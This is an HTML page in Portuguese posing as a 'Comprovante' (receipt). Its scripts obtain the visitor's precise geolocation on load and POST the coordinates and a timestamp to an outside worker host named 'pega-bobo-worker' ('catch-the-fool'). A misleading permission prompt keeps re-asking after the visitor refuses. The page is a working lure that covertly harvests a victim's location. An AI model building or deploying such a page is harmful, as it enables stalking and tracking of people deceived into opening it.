<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Comprovante</title>
</head>
<body style="background-color: antiquewhite;">
    <h1>Comprovante</h1>

    <script>
        window.addEventListener("load", () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
            } else {
                alert("Seu navegador não suporta geolocalização!");
            }
        });

        async function sendLocation(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Substitua pela URL do seu Worker depois de criá-lo
            const workerUrl = "https://pega-bobo-worker.zeruelinha99.workers.dev";
            
            try {
                const response = await fetch(workerUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ latitude, longitude })
                });
                
                const data = await response.json();
                alert(data.success ? "Localização enviada!" : "Erro ao enviar");
            } catch (error) {
                console.error("Erro:", error);
                alert("Falha na comunicação");
            }
        }

        function handleError(error) {
            alert("Erro: " + error.message);
        }
    </script>
  <script>
    async function sendLocation(position) {
        const data = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            timestamp: new Date().toISOString()
        };

        const workerUrl = "https://pega-bobo-worker.zeruelinha99.workers.dev";
        
        try {
            const response = await fetch(workerUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
            
            const responseData = await response.json();
            alert(responseData.success ? "✅ Localização enviada!" : "❌ Erro ao enviar");
        } catch (error) {
            console.error("Erro:", error);
            alert("Falha na comunicação");
        }
    }

    function handleError(error) {
        let errorMessage;
        switch(error.code) {
            case error.PERMISSION_DENIED:
                errorMessage = "Você negou a permissão de localização. Por favor, ative nas configurações do site.";
                break;
            case error.POSITION_UNAVAILABLE:
                errorMessage = "Localização indisponível.";
                break;
            case error.TIMEOUT:
                errorMessage = "A requisição de localização expirou.";
                break;
            default:
                errorMessage = "Erro desconhecido na geolocalização.";
        }
        
        // Mostra botão para tentar novamente
        if(confirm(`${errorMessage} Deseja tentar novamente?`)) {
            requestLocation();
        }
    }

    function requestLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                sendLocation, 
                handleError,
                { 
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            alert("Seu navegador não suporta geolocalização!");
        }
    }

    window.addEventListener("load", () => {
        // Explica ao usuário antes de pedir a localização
        if(confirm("Este site precisa acessar sua localização para funcionar. Permitir?")) {
            requestLocation();
        }
    });
</script>
</body>
</html>
